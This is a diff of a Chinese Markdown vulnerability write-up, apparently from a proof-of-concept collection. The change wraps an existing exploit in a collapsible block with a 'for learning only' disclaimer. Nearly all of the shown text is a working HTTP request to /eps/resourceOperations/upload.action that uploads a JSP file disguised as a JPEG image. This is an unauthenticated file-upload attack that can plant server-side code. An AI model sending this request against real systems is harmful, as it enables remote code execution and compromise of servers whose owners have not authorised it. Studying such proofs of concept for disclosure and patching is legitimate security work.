@@ -34,8 +34,10 @@ icon_hash="-911494769"
 
 发送请求包上传文件
 
-```
-POST /eps/resourceOperations/upload.action HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /eps/resourceOperations/upload.action HTTP/1.1
 Host: 
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
@@ -52,9 +54,10 @@ Content-Length: 212
 Content-Disposition: form-data; name="fileUploader";filename="test.jsp"
 Content-Type: image/jpeg
 
-<%out.print("hello");%>
-------WebKitFormBoundaryTJyhtTNqdMNLZLhj--
-```
+&lt;%out.print("hello");%&gt;
+------WebKitFormBoundaryTJyhtTNqdMNLZLhj--</code></pre>
+
+</details>
 
 上传路径
 
